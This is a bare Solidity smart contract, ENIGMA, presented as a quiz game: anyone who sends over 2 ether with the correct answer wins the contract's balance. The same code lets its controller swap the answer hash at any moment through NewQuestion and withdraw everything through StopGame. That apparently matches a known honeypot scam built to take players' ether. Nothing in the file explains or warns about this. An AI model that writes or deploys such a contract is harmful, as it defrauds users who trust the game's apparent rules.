1 contract ENIGMA {
2     function Try(string _response) external payable {
3         require(msg.sender == tx.origin);
4 
5         if(responseHash == keccak256(_response) && msg.value > 2 ether)
6         {
7             msg.sender.transfer(this.balance);
8         }
9     }
10 
11     string public question;
12 
13     address questionSender;
14 
15     bytes32 responseHash;
16 
17     bytes32 questionerPin = 0x8329b3b70dec2fc3627097802738c2bad57772859f3bfde49baa408c334dace9;
18 
19     function ActivateContract(bytes32 _questionerPin, string _question, string _response) public payable {
20         if(keccak256(_questionerPin)==questionerPin) 
21         {
22             responseHash = keccak256(_response);
23             question = _question;
24             questionSender = msg.sender;
25             questionerPin = 0x0;
26         }
27     }
28 
29     function StopGame() public payable {
30         require(msg.sender==questionSender);
31         msg.sender.transfer(this.balance);
32     }
33 
34     function NewQuestion(string _question, bytes32 _responseHash) public payable {
35         if(msg.sender==questionSender){
36             question = _question;
37             responseHash = _responseHash;
38         }
39     }
40 
41     function newQuestioner(address newAddress) public {
42         if(msg.sender==questionSender)questionSender = newAddress;
43     }
44 
45     function() public payable{}
46 }